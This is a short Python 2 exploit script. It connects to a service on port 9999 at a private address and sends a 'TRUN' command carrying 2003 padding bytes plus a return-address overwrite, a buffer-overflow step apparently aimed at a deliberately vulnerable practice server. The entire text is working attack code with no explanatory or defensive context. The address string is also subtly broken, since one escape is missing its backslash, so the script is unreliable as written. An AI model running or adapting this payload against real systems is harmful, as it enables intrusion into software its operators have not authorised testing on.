#!/usr/bin/python2
import sys, socket

shellcode = "C" * 2003 + "xaf\x11\x50\x62"

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + shellcode))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
